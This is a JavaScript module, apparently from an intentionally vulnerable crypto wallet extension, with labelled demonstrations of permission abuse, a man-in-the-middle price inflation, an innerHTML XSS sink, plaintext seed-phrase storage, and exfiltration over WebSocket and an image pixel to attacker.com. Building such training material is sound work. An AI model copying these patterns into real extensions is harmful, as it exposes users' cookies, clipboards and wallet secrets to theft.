
// Vulnerability: Excessive Permissions Abuse
export async function abusePermissions() {
  try {
    // 1. Clipboard Access (without user knowing that it's happening)
    const clipboard = await navigator.clipboard.readText();
    localStorage.setItem('vw_clipboard_data', clipboard);

    // 2. Tab Access (reading current tab URL)
    const tabs = await chrome.tabs.query({active: true, currentWindow: true});
    if (tabs[0]) {
      localStorage.setItem('vw_current_tab', tabs[0].url);
    }

    // 3. Cookie Access (attempting to read cookies from other domains)
    try {
      const cookies = await chrome.cookies.getAll({domain: 'binance.com'});
      localStorage.setItem('vw_binance_cookies', JSON.stringify(cookies));
    } catch (e) {
      console.log('Cookie access denied');
    }
  } catch (e) {
    console.log('Permission abuse failed:', e);
  }
}

// Vulnerability: Man-in-the-Middle (MitM) Simulation
export async function simulateMitM() {
  try {
    // Simulate fetching token prices from an insecure endpoint (http)
    const response = await fetch('http://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd', {
      method: 'GET',
      headers: {
        'Accept': 'application/json'
      }
    });
    
    const data = await response.json();
    
    // Manipulate price high by 5% and store it
    const manipulatedPrice = data.ethereum.usd * 1.05; // Assuming the response structure
    localStorage.setItem('vw_token_prices', JSON.stringify({
      ETH: manipulatedPrice,
      timestamp: Date.now()
    }));
    
    // Return the manipulated price instead of the original data
    return {
      ETH: manipulatedPrice,
      timestamp: Date.now()
    };
  } catch (e) {
    console.log('MitM simulation failed:', e);
    // Fallback to hardcoded prices
    return {
      ETH: 2000,
      timestamp: Date.now()
    };
  }
}

// Vulnerability: Cross-Site Scripting (XSS)
export function simulateXSS(memo) {
  // Unsafe memo handling - allows script injection
  const txList = document.getElementById('tx-list');
  if (txList && memo) {
    // Vulnerable to XSS if memo contains script tags
    const txEl = document.createElement('div');
    txEl.className = 'tx-item';
    txEl.innerHTML = `
      <div style="display:flex;justify-content:space-between;margin-bottom:4px;">
        <span style="color:#b6b8d6;">✓ 0.1 ETH</span>
        <span style="font-size:0.9em;color:#b6b8d6;">${new Date().toLocaleTimeString()}</span>
      </div>
      <div style="font-size:0.9em;color:#b6b8d6;">Memo: ${memo}</div>
    `;
    txList.prepend(txEl);
  }
}

// Vulnerability: Data Exfiltration
export function simulateExfiltration(data) {
  // Simulate data exfiltration through various channels
  const exfilChannels = [
    // 1. Fake API endpoint
    () => fetch('https://jsonplaceholder.typicode.com/posts', {
      method: 'POST',
      body: JSON.stringify(data)
    }),
    // 2. WebSocket connection
    () => {
      const ws = new WebSocket('ws://attacker.com/ws');
      ws.onopen = () => ws.send(JSON.stringify(data));
    },
    // 3. Image pixel tracking
    () => {
      const img = new Image();
      img.src = `http://attacker.com/track?data=${btoa(JSON.stringify(data))}`;
    }
  ];

  // Try each exfiltration channel
  exfilChannels.forEach(channel => {
    try {
      channel();
    } catch (e) {
      console.log('Exfiltration channel failed:', e);
    }
  });
}

// Vulnerability: Insecure Data Storage
export function insecureStorage(data) {
  // Store sensitive data in localStorage without encryption
  localStorage.setItem('vw_wallet_data', JSON.stringify({
    ...data,
    seedPhrase: data.seedPhrase, // Storing seed phrase in plaintext
    privateKey: '0x' + Math.random().toString(16).slice(2), // Simulated private key
    lastBackup: new Date().toISOString()
  }));
} 